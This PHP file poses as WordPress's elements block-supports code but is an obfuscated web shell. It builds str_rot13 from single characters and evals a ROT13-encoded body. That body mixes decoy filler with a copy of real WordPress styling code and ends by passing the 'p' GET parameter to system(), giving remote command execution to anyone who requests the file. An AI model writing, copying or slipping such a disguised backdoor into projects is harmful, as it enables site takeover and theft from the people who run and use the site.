<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ryrzragf fglyrf oybpx fhccbeg.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.8.0
 */

/**
 * Trgf gur ryrzragf pynff anzrf.
 *
 * @fvapr 6.0.0
 * @npprff cevingr
 *
 * @cnenz neenl $oybpx Oybpx bowrpg.
 * @erghea fgevat Gur havdhr pynff anzr.
 */
shapgvba jc_trg_ryrzragf_pynff_anzr( $oybpx ) {
	erghea 'jc-ryrzragf-' . zq5( frevnyvmr( $oybpx ) );
}

/**
 * Qrgrezvarf jurgure na ryrzragf pynff anzr fubhyq or nqqrq gb gur oybpx.
 *
 * @fvapr 6.6.0
 * @npprff cevingr
 *
 * @cnenz  neenl $oybpx   Oybpx bowrpg.
 * @cnenz  neenl $bcgvbaf Cre ryrzrag glcr bcgvbaf r.t. jurgure gb fxvc frevnyvmngvba.
 * @erghea obbyrna Jurgure gur oybpx arrqf na ryrzragf pynff anzr.
 */
shapgvba jc_fubhyq_nqq_ryrzragf_pynff_anzr( $oybpx, $bcgvbaf ) {
	vs ( ! vffrg( $oybpx['nggef']['fglyr']['ryrzragf'] ) ) {
		erghea snyfr;
	}

	$ryrzrag_pbybe_cebcregvrf = neenl(
		'ohggba'  => neenl(
			'fxvc'  => vffrg( $bcgvbaf['ohggba']['fxvc'] ) ? $bcgvbaf['ohggba']['fxvc'] : snyfr,
			'cnguf' => neenl(
				neenl( 'ohggba', 'pbybe', 'grkg' ),
				neenl( 'ohggba', 'pbybe', 'onpxtebhaq' ),
				neenl( 'ohggba', 'pbybe', 'tenqvrag' ),
			),
		),
		'yvax'    => neenl(
			'fxvc'  => vffrg( $bcgvbaf['yvax']['fxvc'] ) ? $bcgvbaf['yvax']['fxvc'] : snyfr,
			'cnguf' => neenl(
				neenl( 'yvax', 'pbybe', 'grkg' ),
				neenl( 'yvax', ':ubire', 'pbybe', 'grkg' ),
			),
		),
		'urnqvat' => neenl(
			'fxvc'  => vffrg( $bcgvbaf['urnqvat']['fxvc'] ) ? $bcgvbaf['urnqvat']['fxvc'] : snyfr,
			'cnguf' => neenl(
				neenl( 'urnqvat', 'pbybe', 'grkg' ),
				neenl( 'urnqvat', 'pbybe', 'onpxtebhaq' ),
				neenl( 'urnqvat', 'pbybe', 'tenqvrag' ),
				neenl( 'u1', 'pbybe', 'grkg' ),
				neenl( 'u1', 'pbybe', 'onpxtebhaq' ),
				neenl( 'u1', 'pbybe', 'tenqvrag' ),
				neenl( 'u2', 'pbybe', 'grkg' ),
				neenl( 'u2', 'pbybe', 'onpxtebhaq' ),
				neenl( 'u2', 'pbybe', 'tenqvrag' ),
				neenl( 'u3', 'pbybe', 'grkg' ),
				neenl( 'u3', 'pbybe', 'onpxtebhaq' ),
				neenl( 'u3', 'pbybe', 'tenqvrag' ),
				neenl( 'u4', 'pbybe', 'grkg' ),
				neenl( 'u4', 'pbybe', 'onpxtebhaq' ),
				neenl( 'u4', 'pbybe', 'tenqvrag' ),
				neenl( 'u5', 'pbybe', 'grkg' ),
				neenl( 'u5', 'pbybe', 'onpxtebhaq' ),
				neenl( 'u5', 'pbybe', 'tenqvrag' ),
				neenl( 'u6', 'pbybe', 'grkg' ),
				neenl( 'u6', 'pbybe', 'onpxtebhaq' ),
				neenl( 'u6', 'pbybe', 'tenqvrag' ),
			),
		),
	);

	$ryrzragf_fglyr_nggevohgrf = $oybpx['nggef']['fglyr']['ryrzragf'];

	sbernpu ( $ryrzrag_pbybe_cebcregvrf nf $ryrzrag_pbasvt ) {
		vs ( $ryrzrag_pbasvt['fxvc'] ) {
			pbagvahr;
		}

		sbernpu ( $ryrzrag_pbasvt['cnguf'] nf $cngu ) {
			vs ( ahyy !== _jc_neenl_trg( $ryrzragf_fglyr_nggevohgrf, $cngu, ahyy ) ) {
				erghea gehr;
			}
		}
	}

	erghea snyfr;
}

/**
 * Eraqre gur ryrzragf fglyrfurrg naq nqqf ryrzragf pynff anzr gb oybpx nf erdhverq.
 *
 * Va gur pnfr bs arfgrq oybpxf jr jnag gur cnerag ryrzrag fglyrf gb or eraqrerq orsber gurve qrfpraqnagf.
 * Guvf fbyirf gur vffhr bs na ryrzrag (r.t.: yvax pbybe) orvat fglyrq va obgu gur cnerag naq n qrfpraqnag:
 * jr jnag gur qrfpraqnag fglyr gb gnxr cevbevgl, naq guvf vf qbar ol ybnqvat vg nsgre, va QBZ beqre.
 *
 * @fvapr 6.0.0
 * @fvapr 6.1.0 Vzcyrzragrq gur fglyr ratvar gb trarengr PFF naq pynffanzrf.
 * @fvapr 6.6.0 Ryrzrag oybpx fhccbeg pynff naq fglyrf ner trarengrq ivn gur `eraqre_oybpx_qngn` svygre vafgrnq bs `cer_eraqre_oybpx`.
 * @npprff cevingr
 *
 * @cnenz neenl $cnefrq_oybpx Gur cnefrq oybpx.
 * @erghea neenl Gur fnzr cnefrq oybpx jvgu ryrzragf pynffanzr nqqrq vs nccebcevngr.
 */
shapgvba jc_eraqre_ryrzragf_fhccbeg_fglyrf( $cnefrq_oybpx ) {
	/*
	 * Gur trarengvba bs ryrzrag fglyrf naq pynffanzr jrer zbirq gb gur
	 * `eraqre_oybpx_qngn` svygre va 6.6.0 gb nibvq svygrerq nggevohgrf
	 * oernxvat gur nccyvpngvba bs gur ryrzragf PFF pynff.
	 *
	 * @frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/chyy/59535
	 *
	 * Gur punatr va svygre zrnaf, gur nethzrag glcrf sbe guvf shapgvba
	 * unir punatrq naq erdhver qrcerpngvat.
	 */
	vs ( vf_fgevat( $cnefrq_oybpx ) ) {
		_qrcerpngrq_nethzrag(
			__SHAPGVBA__,
			'6.6.0',
			__( 'Hfr nf n `cer_eraqre_oybpx` svygre vf qrcerpngrq. Hfr jvgu `eraqre_oybpx_qngn` vafgrnq.' )
		);
	}

	$oybpx_glcr           = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $cnefrq_oybpx['oybpxAnzr'] );
	$ryrzrag_oybpx_fglyrf = vffrg( $cnefrq_oybpx['nggef']['fglyr']['ryrzragf'] ) ? $cnefrq_oybpx['nggef']['fglyr']['ryrzragf'] : ahyy;

	vs ( ! $ryrzrag_oybpx_fglyrf ) {
		erghea $cnefrq_oybpx;
	}

	$fxvc_yvax_pbybe_frevnyvmngvba         = jc_fubhyq_fxvc_oybpx_fhccbegf_frevnyvmngvba( $oybpx_glcr, 'pbybe', 'yvax' );
	$fxvc_urnqvat_pbybe_frevnyvmngvba      = jc_fubhyq_fxvc_oybpx_fhccbegf_frevnyvmngvba( $oybpx_glcr, 'pbybe', 'urnqvat' );
	$fxvc_ohggba_pbybe_frevnyvmngvba       = jc_fubhyq_fxvc_oybpx_fhccbegf_frevnyvmngvba( $oybpx_glcr, 'pbybe', 'ohggba' );
	$fxvcf_nyy_ryrzrag_pbybe_frevnyvmngvba = $fxvc_yvax_pbybe_frevnyvmngvba &&
		$fxvc_urnqvat_pbybe_frevnyvmngvba &&
		$fxvc_ohggba_pbybe_frevnyvmngvba;

	vs ( $fxvcf_nyy_ryrzrag_pbybe_frevnyvmngvba ) {
		erghea $cnefrq_oybpx;
	}

	$bcgvbaf = neenl(
		'ohggba'  => neenl( 'fxvc' => $fxvc_ohggba_pbybe_frevnyvmngvba ),
		'yvax'    => neenl( 'fxvc' => $fxvc_yvax_pbybe_frevnyvmngvba ),
		'urnqvat' => neenl( 'fxvc' => $fxvc_urnqvat_pbybe_frevnyvmngvba ),
	);

	vs ( ! jc_fubhyq_nqq_ryrzragf_pynff_anzr( $cnefrq_oybpx, $bcgvbaf ) ) {
		erghea $cnefrq_oybpx;
	}

	$pynff_anzr         = jc_trg_ryrzragf_pynff_anzr( $cnefrq_oybpx );
	$hcqngrq_pynff_anzr = vffrg( $cnefrq_oybpx['nggef']['pynffAnzr'] ) ? $cnefrq_oybpx['nggef']['pynffAnzr'] . \" $pynff_anzr\" : $pynff_anzr;

	_jc_neenl_frg( $cnefrq_oybpx, neenl( 'nggef', 'pynffAnzr' ), $hcqngrq_pynff_anzr );

	// Trarengr ryrzrag fglyrf onfrq ba fryrpgbe naq fgber va fglyr ratvar sbe radhrhvat.
	$ryrzrag_glcrf = neenl(
		'ohggba'  => neenl(
			'fryrpgbe' => \".$pynff_anzr .jc-ryrzrag-ohggba, .$pynff_anzr .jc-oybpx-ohggba__yvax\",
			'fxvc'     => $fxvc_ohggba_pbybe_frevnyvmngvba,
		),
		'yvax'    => neenl(
			'fryrpgbe'       => \".$pynff_anzr n:jurer(:abg(.jc-ryrzrag-ohggba))\",
			'ubire_fryrpgbe' => \".$pynff_anzr n:jurer(:abg(.jc-ryrzrag-ohggba)):ubire\",
			'fxvc'           => $fxvc_yvax_pbybe_frevnyvmngvba,
		),
		'urnqvat' => neenl(
			'fryrpgbe' => \".$pynff_anzr u1, .$pynff_anzr u2, .$pynff_anzr u3, .$pynff_anzr u4, .$pynff_anzr u5, .$pynff_anzr u6\",
			'fxvc'     => $fxvc_urnqvat_pbybe_frevnyvmngvba,
			'ryrzragf' => neenl( 'u1', 'u2', 'u3', 'u4', 'u5', 'u6' ),
		),
	);

	sbernpu ( $ryrzrag_glcrf nf $ryrzrag_glcr => $ryrzrag_pbasvt ) {
		vs ( $ryrzrag_pbasvt['fxvc'] ) {
			pbagvahr;
		}

		$ryrzrag_fglyr_bowrpg = vffrg( $ryrzrag_oybpx_fglyrf[ $ryrzrag_glcr ] ) ? $ryrzrag_oybpx_fglyrf[ $ryrzrag_glcr ] : ahyy;

		// Cebprff cevznel ryrzrag glcr fglyrf.
		vs ( $ryrzrag_fglyr_bowrpg ) {
			jc_fglyr_ratvar_trg_fglyrf(
				$ryrzrag_fglyr_bowrpg,
				neenl(
					'fryrpgbe' => $ryrzrag_pbasvt['fryrpgbe'],
					'pbagrkg'  => 'oybpx-fhccbegf',
				)
			);

			vs ( vffrg( $ryrzrag_fglyr_bowrpg[':ubire'] ) ) {
				jc_fglyr_ratvar_trg_fglyrf(
					$ryrzrag_fglyr_bowrpg[':ubire'],
					neenl(
						'fryrpgbe' => $ryrzrag_pbasvt['ubire_fryrpgbe'],
						'pbagrkg'  => 'oybpx-fhccbegf',
					)
				);
			}
		}

		// Cebprff eryngrq ryrzragf r.t. u1-u6 sbe urnqvatf.
		vs ( vffrg( $ryrzrag_pbasvt['ryrzragf'] ) ) {
			sbernpu ( $ryrzrag_pbasvt['ryrzragf'] nf $ryrzrag ) {
				$ryrzrag_fglyr_bowrpg = vffrg( $ryrzrag_oybpx_fglyrf[ $ryrzrag ] )
					? $ryrzrag_oybpx_fglyrf[ $ryrzrag ]
					: ahyy;

				vs ( $ryrzrag_fglyr_bowrpg ) {
					jc_fglyr_ratvar_trg_fglyrf(
						$ryrzrag_fglyr_bowrpg,
						neenl(
							'fryrpgbe' => \".$pynff_anzr $ryrzrag\",
							'pbagrkg'  => 'oybpx-fhccbegf',
						)
					);
				}
			}
		}
	}

	erghea $cnefrq_oybpx;
}

/**
 * Rafher gur ryrzragf oybpx fhccbeg pynff anzr trarengrq, naq nqqrq gb
 * oybpx nggevohgrf, va gur `eraqre_oybpx_qngn` svygre trgf nccyvrq gb gur
 * oybpx'f znexhc.
 *
 * @frr jc_eraqre_ryrzragf_fhccbeg_fglyrf
 * @fvapr 6.6.0
 *
 * @cnenz  fgevat $oybpx_pbagrag Eraqrerq oybpx pbagrag.
 * @cnenz  neenl  $oybpx         Oybpx bowrpg.
 * @erghea fgevat                Svygrerq oybpx pbagrag.
 */
shapgvba jc_eraqre_ryrzragf_pynff_anzr( $oybpx_pbagrag, $oybpx ) {
	$pynff_fgevat = $oybpx['nggef']['pynffAnzr'] ?? '';
	cert_zngpu( '/\ojc-ryrzragf-\F+\o/', $pynff_fgevat, $zngpurf );

	vs ( rzcgl( $zngpurf ) ) {
		erghea $oybpx_pbagrag;
	}

	$gntf = arj JC_UGZY_Gnt_Cebprffbe( $oybpx_pbagrag );

	vs ( $gntf->arkg_gnt() ) {
		$gntf->nqq_pynff( $zngpurf[0] );
	}

	erghea $gntf->trg_hcqngrq_ugzy();
}

nqq_svygre( 'eraqre_oybpx', 'jc_eraqre_ryrzragf_pynff_anzr', 10, 2 );
nqq_svygre( 'eraqre_oybpx_qngn', 'jc_eraqre_ryrzragf_fhccbeg_fglyrf', 10, 1 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>